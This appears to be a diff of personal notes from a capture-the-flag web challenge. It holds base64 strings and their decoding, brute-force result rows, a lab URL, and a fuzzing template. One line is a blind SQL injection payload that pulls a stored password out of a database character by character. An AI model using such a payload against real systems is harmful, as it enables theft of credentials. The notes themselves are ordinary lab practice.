@@ -161,10 +161,6 @@ gid = 4
 id = 4
 password position 3
 
-d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==++
-d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==
-wuuut?youTryHackUs!??!
-
 470	33	+	200	false	false	13344	
 471	34	+	200	false	false	13344	
 
@@ -223,7 +219,7 @@ c2framz1m2gybdj1ywrmbi4zazjs
 
 YxnKA24xmmHLmTI4AGRWodkxodjozde7bgthc2rt
 
-D3v1DxQ/EW91vHJ5Sgfja1vzit8/iq==++
+d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==
 
 6?(7!=<9)&!
 
@@ -307,13 +303,15 @@ admin
 2 total_connections
 3 total_connections
 
-src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
-
-http://10.8.32.1:42794/82b8a831e18b5e105bd5928e89e21032/img/item-03.jpg
 
 check=%2B12345678910' or ASCII(substring((select base64_pw from passwords limit 3,1),30,1))=ASCII('Q'); --
 
 https://www.base64decode.org/
+
+d3V1dXQ/eW91VHJ5SGFja1VzIT8/IQ==
+in base64 it is decoded as wuuut?youTryHackUs!??!
+
+http://10.8.32.1:42794/82b8a831e18b5e105bd5928e89e21032/83df67dbe149dd3f95a1c2eeffd55826/#contact
 
 
 query=§aaa§&exec=Execute
